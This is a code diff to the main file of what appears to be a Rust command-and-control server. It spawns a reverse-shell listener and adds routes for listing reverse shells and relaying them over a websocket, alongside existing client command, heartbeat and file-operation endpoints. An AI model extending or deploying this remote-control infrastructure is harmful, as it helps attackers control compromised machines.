@@ -3,6 +3,7 @@ pub mod auth;
 pub mod error;
 pub mod handlers;
 pub mod managers;
+pub mod reverse_shell_listener; // Declare the new module
 pub mod state;
 
 use crate::{
@@ -55,6 +56,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Spawn background cleanup task
     tokio::spawn(cleanup_task(state.clone()));
 
+    // Spawn reverse shell listener task
+    let reverse_shell_port = config.reverse_shell_port;
+    let shell_manager_clone = state.shell_manager.clone();
+    tokio::spawn(async move {
+        if let Err(e) = reverse_shell_listener::start_listener(reverse_shell_port, shell_manager_clone).await {
+            eprintln!("Reverse shell listener failed: {}", e);
+        }
+    });
+
     // Routes that require authentication
     let protected_routes = Router::new()
         .route("/", get(web::index))
@@ -70,7 +80,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .route("/api/heartbeat", post(api::handle_heartbeat))
         .route("/api/commands/{client_id}", get(api::get_commands))
         .route("/api/command_result", post(api::handle_command_result))
-        .route("/api/shell_data", post(api::handle_shell_data))
         .route(
             "/api/file_operation_response/{client_id}",
             post(api::handle_file_operation_response),
@@ -88,6 +97,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .route(
             "/api/clients/{client_id}/reverse_shell",
             post(api::initiate_reverse_shell),
+        )
+        .route(
+            "/api/reverse_shells",
+            get(api::list_reverse_shells),
+        )
+        .route(
+            "/ws/shell/{connection_id}",
+            get(api::handle_reverse_shell_websocket),
         )
         .route("/api/files/list", post(file::list_directory_handler))
         .route("/api/files/delete", post(file::delete_path_handler))
